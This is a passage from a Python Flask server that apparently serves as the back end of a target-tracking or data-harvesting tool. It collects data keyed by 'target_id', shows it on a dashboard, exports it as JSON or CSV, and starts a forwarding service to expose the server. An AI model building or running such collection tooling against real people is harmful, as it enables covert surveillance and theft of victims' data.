        print(f"{Fore.LIGHTBLACK_EX}[{Fore.WHITE}DATA EXPORTED{Fore.LIGHTBLACK_EX}]{Fore.RESET} {Fore.RED}{json_file}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[!] Export failed: {e}{Fore.RESET}")
    
    # Also export to all targets file
    try:
        all_targets_file = export_all_targets()
        print(f"{Fore.LIGHTBLACK_EX}[{Fore.WHITE}ALL TARGETS UPDATED{Fore.LIGHTBLACK_EX}]{Fore.RESET} {Fore.RED}{all_targets_file}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[!] All targets export failed: {e}{Fore.RESET}")
    
    print(f"{Fore.LIGHTBLACK_EX}\n{'-'*65}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}{'-'*65}\n{Fore.RESET}")
    
    return jsonify({"status": "ok", "target_id": target_id})

@app.route('/dashboard')
def dashboard():
    """Simple web dashboard to view collected data"""
    return render_template("dashboard.html", targets=target_data)

@app.route('/api/export/<format>')
def export_data(format):
    """API endpoint to export data from logs folder"""
    import os
    
    try:
        if format == "json":
            filename = export_data_json(target_data)
            return send_file(filename, as_attachment=True, download_name=os.path.basename(filename))
        elif format == "csv":
            filename = export_data_csv(target_data)
            return send_file(filename, as_attachment=True, download_name=os.path.basename(filename))
        elif format == "all":
            filename = export_all_targets()
            return send_file(filename, as_attachment=True, download_name=os.path.basename(filename))
        else:
            return jsonify({"error": "Invalid format"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/logs/<filename>')
def serve_log_file(filename):
    """Serve log files from logs directory"""
    import os
    from flask import send_from_directory
    
    logs_dir = os.path.join(os.getcwd(), 'logs')
    return send_from_directory(logs_dir, filename)

@app.route('/logs')
def logs_page():
    """Logs management page"""
    return render_template("logs.html")

@app.route('/api/logs')
def list_logs():
    """List all log files in logs directory"""
    import os
    
    logs_dir = os.path.join(os.getcwd(), 'logs')
    if not os.path.exists(logs_dir):
        return jsonify({"logs": []})
    
    log_files = []
    for filename in os.listdir(logs_dir):
        filepath = os.path.join(logs_dir, filename)
        if os.path.isfile(filepath):
            stat = os.stat(filepath)
            log_files.append({
                'filename': filename,
                'size': stat.st_size,
                'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
            })
    
    # Sort by modification time (newest first)
    log_files.sort(key=lambda x: x['modified'], reverse=True)
    
    return jsonify({"logs": log_files})
    

    
    
if __name__ == '__main__':
    
    try:
        global forwarding_service
        
        test_tools()
        set_variables()    
        
        forwarding_service['forward_func']()
    
            
        print_banner()
        
        app.run(debug=False, port=port)
        
    except Exception as e:
        sys.exit(1)
        print(e)
    
